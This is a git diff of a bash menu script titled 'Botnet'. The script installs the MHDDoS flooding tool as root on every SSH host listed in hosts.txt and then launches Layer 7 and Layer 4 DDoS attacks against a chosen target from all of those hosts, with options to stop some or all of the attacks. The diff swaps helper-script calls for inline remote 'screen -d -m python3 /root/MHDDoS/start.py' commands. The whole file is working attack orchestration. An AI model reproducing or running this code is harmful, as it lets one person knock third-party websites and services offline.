@@ -1,15 +1,16 @@
 #!/bin/bash
 
 CURRENT_DIR=$(dirname "$0")
+touch -a "$CURRENT_DIR/hosts.txt"
 export DIALOGRC="$CURRENT_DIR/.dialogrc"
 
 while : ; do
-    MENU_OPTION=$(dialog --title 'Botnet' --menu --stdout "Choose option:" 15 55 5 1 'Setup SSH hosts' 2 'Botnet attack on host' 3 'Stop all botnet attacks' 4 'Stop certain host/ip attack in botnet' 5 'Exit')
+    MENU_OPTION=$(dialog --title 'Botnet' --menu --stdout "Before the start populate your hosts.txt file!" 15 55 5 1 'Setup SSH hosts' 2 'Botnet attack on host' 3 'Stop all botnet attacks' 4 'Stop certain host/ip attack in botnet' 5 'Exit')
 
     case $MENU_OPTION in
 
     1)
-        if dialog --title "Setup SSH hosts" --stdout --yesno "Following command will install MMHDDoS tool to your SSH hosts\n                    Do you want to proceed?" 7 65; then
+        if dialog --title "Setup SSH hosts" --stdout --yesno "Following command will install MHDDoS tool to your SSH hosts\n                    Do you want to proceed?" 7 65; then
           CURRENT_DIR=$(dirname "$0")
           bash "$CURRENT_DIR/runoverssh" --script "$CURRENT_DIR/attacker-setup.sh" --hostsfile "$CURRENT_DIR/hosts.txt" root
         fi
@@ -32,7 +33,8 @@ while : ; do
 
             clear
             printf "Starting L7 attack...\n"
-            bash "${CURRENT_DIR}/botnet-attack.sh" "$ATTACK_TYPE" "$TARGET" "$SOCKS_TYPE" "$THREADS" "$PROXY_FILE" "$RPS" "$DURATION"
+            bash "$CURRENT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $TARGET $SOCKS_TYPE $THREADS $PROXY_FILE $RPS $DURATION" --hostsfile "$CURRENT_DIR/hosts.txt"
+
             break
             ;;
 
@@ -46,7 +48,8 @@ while : ; do
 
             clear
             printf "Starting L4 attack...\n"
-            bash "${CURRENT_DIR}/botnet-attack.sh" "$ATTACK_TYPE" "$TARGET" "$THREADS" "$DURATION" "$SOCKS_TYPE" "$PROXY_FILE"
+            bash "$CURRENT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $TARGET $THREADS $DURATION $SOCKS_TYPE $PROXY_FILE" --hostsfile "$CURRENT_DIR/hosts.txt"
+
             break
             ;;
 
@@ -59,13 +62,14 @@ while : ; do
         ;;
         
     3)
-        bash "${CURRENT_DIR}/botnet-stop-all.sh"
+        bash "$CURRENT_DIR/runoverssh" root "killall screen" --hostsfile "$CURRENT_DIR/hosts.txt"
         break
         ;;
     
     4)
         TARGET=$(bash "${CURRENT_DIR}/url.sh")
-        bash "${CURRENT_DIR}/botnet-stop-certain.sh" "$TARGET"
+        bash "$CURRENT_DIR/runoverssh" root "pkill -f '$TARGET'" --hostsfile "$CURRENT_DIR/hosts.txt"
+
         break
         ;;
     
